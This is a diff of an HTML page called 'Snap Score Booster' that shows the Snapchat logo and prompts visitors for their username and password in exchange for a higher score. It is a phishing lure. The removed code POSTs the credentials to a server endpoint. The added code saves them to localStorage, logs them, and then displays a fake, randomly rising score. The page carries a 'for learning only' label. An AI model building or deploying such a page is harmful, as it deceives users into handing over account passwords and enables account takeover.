@@ -1,127 +1,77 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Snap Score Booster</title>
-
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    }
-
-    body {
-      background: #FFFC00;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .container {
-      background: white;
-      border-radius: 20px;
-      padding: 40px 30px;
-      width: 90%;
-      max-width: 400px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-      text-align: center;
-    }
-
-    .logo {
-      width: 120px;
-      margin: 0 auto 20px;
-    }
-
-    h1 {
-      font-size: 26px;
-      margin-bottom: 10px;
-      font-weight: bold;
-    }
-
-    p {
-      color: #555;
-      margin-bottom: 25px;
-    }
-
-    input {
-      width: 100%;
-      padding: 14px;
-      margin: 12px 0;
-      border: 1px solid #ddd;
-      border-radius: 10px;
-      font-size: 16px;
-      background: #f9f9f9;
-    }
-
-    button {
-      width: 100%;
-      padding: 15px;
-      background: #000;
-      color: white;
-      border: none;
-      border-radius: 10px;
-      font-size: 18px;
-      cursor: pointer;
-      margin-top: 15px;
-    }
-
-    button:hover {
-      background: #333;
-    }
-
-    #msg {
-      margin-top: 20px;
-      color: green;
-      font-weight: bold;
-    }
-
-    .note {
-      font-size: 12px;
-      color: #888;
-      margin-top: 20px;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Snap Score Booster</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto; }
+  body { background:#FFFC00; min-height:100vh; display:flex; align-items:center; justify-content:center; }
+  .container { background:white; border-radius:20px; padding:40px 30px; width:90%; max-width:400px; box-shadow:0 10px 30px rgba(0,0,0,0.2); text-align:center; }
+  .logo { width:120px; margin:0 auto 20px; }
+  h1 { font-size:26px; margin-bottom:10px; font-weight:bold; }
+  p { color:#555; margin-bottom:25px; }
+  input { width:100%; padding:14px; margin:12px 0; border:1px solid #ddd; border-radius:10px; font-size:16px; background:#f9f9f9; }
+  button { width:100%; padding:15px; background:#000; color:white; border:none; border-radius:10px; font-size:18px; cursor:pointer; margin-top:15px; }
+  button:hover { background:#333; }
+  .score-section { display:none; margin-top:30px; }
+  .score-box { background:#000; color:#FFFC00; padding:20px; border-radius:15px; font-size:24px; font-weight:bold; margin-bottom:20px; }
+  .note { font-size:12px; color:#888; margin-top:20px; }
+</style>
 </head>
 <body>
 
-<div class="container">
+<div class="container" id="loginPage">
   <img class="logo" src="https://upload.wikimedia.org/wikipedia/en/c/c0/Snapchat_Logo.svg" alt="Snap Logo">
-
   <h1>Snap Score Booster</h1>
   <p>Login to increase your Snap Score fast!</p>
 
   <input type="text" id="username" placeholder="Username">
   <input type="password" id="password" placeholder="Password">
 
-  <button onclick="sendData()">Log In & Boost Score</button>
-
-  <p id="msg"></p>
+  <button onclick="login()">Log In & Boost Score</button>
 
   <p class="note">Demo project – for learning only</p>
 </div>
 
-<script>
-async function sendData() {
-  const username = document.getElementById("username").value;
-  const password = document.getElementById("password").value;
+<div class="container score-section" id="scorePage">
+  <img class="logo" src="https://upload.wikimedia.org/wikipedia/en/c/c0/Snapchat_Logo.svg" alt="Snap Logo">
+  <h1>Your Snap Score</h1>
+  <div class="score-box" id="scoreDisplay">0</div>
+  <button onclick="boostScore()">Increase Score Now!</button>
+  <p class="note">Saved in your browser only (localStorage)</p>
+</div>
 
-  if(username === "" || password === ""){
-    alert("Please fill both fields");
+<script>
+function login() {
+  const user = document.getElementById("username").value.trim();
+  const pass = document.getElementById("password").value.trim();
+
+  if(user === "" || pass === "") {
+    alert("Fill both fields!");
     return;
   }
 
-  const res = await fetch("/save", {
-    method: "POST",
-    headers: {"Content-Type":"application/json"},
-    body: JSON.stringify({ username, password })
-  });
+  // Save in localStorage
+  let users = JSON.parse(localStorage.getItem("users")) || [];
+  users.push({username: user, password: pass});
+  localStorage.setItem("users", JSON.stringify(users));
+  console.log("Saved users:", users);
 
-  const data = await res.text();
-  document.getElementById("msg").innerText = data;
+  // Show score page
+  document.getElementById('loginPage').style.display = 'none';
+  document.getElementById('scorePage').style.display = 'block';
+  
+  // Fake starting score
+  document.getElementById('scoreDisplay').innerText = '12,456';
+}
+
+function boostScore() {
+  let scoreEl = document.getElementById('scoreDisplay');
+  let score = parseInt(scoreEl.innerText.replace(/,/g,''));
+  score += Math.floor(Math.random() * 10000) + 100; // random boost
+  scoreEl.innerText = score.toLocaleString();
+  alert("Score boosted! 🔥");
 }
 </script>
 
